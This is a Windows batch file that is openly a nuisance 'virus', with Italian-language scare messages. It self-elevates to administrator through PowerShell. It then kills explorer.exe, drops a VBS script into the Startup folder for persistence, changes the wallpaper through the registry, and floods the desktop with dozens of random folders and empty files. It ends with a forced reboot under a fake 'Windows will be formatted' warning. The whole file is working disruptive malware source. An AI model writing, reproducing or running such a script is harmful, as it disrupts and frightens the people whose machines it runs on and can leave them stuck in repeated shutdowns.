@echo off

cd "%userprofile%\desktop\final virus"

if exist msg.vbs (
echo.
) else (
exit
)


if exist stdwn.vbs (
echo.
) else (
exit
)


if exist photo.jpg (
echo.
) else (
exit
)



NET SESSION >nul 2>&1
if %errorlevel% neq 0 (
PowerShell -Command "& {Start-Process %0 -Verb RunAs}
exit
) else (
goto start
)


:start
mode 200,70
color c
title 
echo			ATTENZIONE!
echo.
echo 		STAI PER ESSERE HACKERATO!
echo.
echo 		IL TUO COMPUTER MORIRA' SE PREMERAI UN TASTO!!
echo.
echo 		STAI ATTENTO!!!
echo.&echo.&echo.
echo 		Premere un tasto per distruggere il tuo PC . . .
pause >nul
cls
taskkill /f /im explorer.exe
cls
msg.vbs
move photo.jpg %temp%
cls
move stdwn.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
cls
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallPaper /f /t REG_SZ /d %temp%\photo.jpg
cls
cd %userprofile%\desktop
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
mkdir %random%
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
fsutil file createnew %random% 0
cls
shutdown -r -t 5 -c "Windows verra' formattato tra 5 secondi."
cls
exit